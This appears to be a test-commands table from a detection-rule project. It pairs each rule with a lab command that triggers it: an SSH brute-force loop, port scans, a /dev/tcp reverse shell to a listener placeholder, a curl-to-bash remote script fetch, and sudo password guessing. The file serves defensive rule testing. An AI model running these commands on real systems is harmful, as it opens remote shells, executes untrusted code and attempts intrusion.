# Test commands

Each command here generates the event that the corresponding rule detects.
**Run only against systems you own.** These are lab commands, not a toolkit.

| Rule | Command | Doc |
|------|---------|-----|
| ssh_bruteforce | `for i in $(seq 1 15); do ssh wronguser@LAB_IP; done` | [docs/ssh_bruteforce.md](../docs/ssh_bruteforce.md) |
| port_scan_burst | `python3 netrecon.py LAB_IP -p 1-200` | [docs/port_scan_burst.md](../docs/port_scan_burst.md) |
| reverse_shell_devtcp | `bash -c 'bash -i >& /dev/tcp/LISTENER_IP/4444 0>&1'` | [docs/reverse_shell_devtcp.md](../docs/reverse_shell_devtcp.md) |
| sudo_abuse | `for i in $(seq 1 5); do echo wrongpassword \| sudo -S id; done` | [docs/sudo_abuse.md](../docs/sudo_abuse.md) |
| curl_pipe_bash | `curl -s http://LISTENER_IP/hello.sh \| bash` | [docs/curl_pipe_bash.md](../docs/curl_pipe_bash.md) |
| slow_scan | `python3 netrecon.py LAB_IP -p 1-200 -d 3` | [docs/slow_scan.md](../docs/slow_scan.md) |
